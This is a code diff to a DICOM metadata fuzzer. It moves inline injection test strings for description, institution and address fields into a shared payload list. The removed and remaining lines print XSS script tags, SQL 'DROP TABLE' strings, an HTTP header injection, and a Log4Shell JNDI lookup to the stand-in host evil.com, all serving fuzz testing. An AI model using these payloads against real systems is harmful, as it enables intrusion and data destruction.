@@ -360,12 +360,10 @@ class MetadataFuzzer(FormatFuzzerBase):
                     "",  # Empty
                     "A" * 65,  # Over 64-char LO limit
                     "CT HEAD W/O CONTRAST\x00HIDDEN",  # Null byte in realistic desc
-                    "MR BRAIN <script>alert(1)</script>",  # XSS in description
-                    "PET/CT '; DROP TABLE series; --",  # SQL injection
                     "CHEST\nXRAY\nPA\nLATERAL",  # Newlines
                     "DESCRIPTION" * 100,  # Very long
-                    "US ABDOMEN ${jndi:ldap://evil.com}",  # Log4Shell in description
                     "\x1b[31mRED SERIES\x1b[0m",  # ANSI escape codes
+                    *INJECTION_PAYLOADS[:3],  # SQL, path traversal, XSS
                 ]
             )
 
@@ -399,12 +397,11 @@ class MetadataFuzzer(FormatFuzzerBase):
                 [
                     "",  # Empty
                     "A" * 65,  # Over 64-char LO limit
-                    "Hospital <script>alert('XSS')</script>",  # XSS
-                    "St. Mary's Hospital'; DROP TABLE institutions;--",  # SQL
                     "HOSPITAL\x00HIDDEN",  # Null byte
                     "General Hospital\nSecond Line",  # Newline
                     "Medical Center" * 50,  # Very long
                     "\xe4\xb8\x8a\xe6\xb5\xb7\xe5\x8c\xbb\xe9\x99\xa2",  # Chinese hospital
+                    *INJECTION_PAYLOADS[:2],  # SQL, path traversal
                 ]
             )
 
@@ -416,7 +413,7 @@ class MetadataFuzzer(FormatFuzzerBase):
                     "123 Main St\x00Hidden Address",  # Null byte
                     "456 Oak Ave\r\nInjected-Header: evil",  # HTTP header injection
                     "ADDRESS" * 200,  # Very long
-                    "789 Pine Rd, City, ST 12345\n<script>alert(1)</script>",
+                    *INJECTION_PAYLOADS[:2],  # SQL, path traversal
                 ]
             )
 
